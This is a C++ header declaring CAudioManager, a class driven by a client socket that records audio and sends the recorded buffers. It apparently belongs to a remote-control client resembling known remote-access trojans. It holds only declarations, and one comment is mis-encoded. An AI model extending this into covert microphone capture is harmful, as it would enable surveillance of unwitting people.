// AudioManager.h: interface for the CAudioManager class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_AUDIOMANAGER_H__B47ECAB3_9810_4031_9E2E_BC34825CAD74__INCLUDED_)
#define AFX_AUDIOMANAGER_H__B47ECAB3_9810_4031_9E2E_BC34825CAD74__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

#include "Manager.h"
#include "Audio.h"


class CAudioManager : public CManager
{
public:
	void OnReceive(LPBYTE lpBuffer, UINT nSize);
	BOOL Initialize();
	CAudioManager(CClientSocket* ClientObject);
	virtual ~CAudioManager();
	BOOL  m_bIsWorking;
	HANDLE m_hWorkThread;
	static DWORD WorkThread(LPVOID lParam);
	BOOL SendRecordBuffer();

	CAudio* m_AudioObject;
	LPBYTE	szPacket; // ??Ƶ??????
};

#endif // !defined(AFX_AUDIOMANAGER_H__B47ECAB3_9810_4031_9E2E_BC34825CAD74__INCLUDED_)
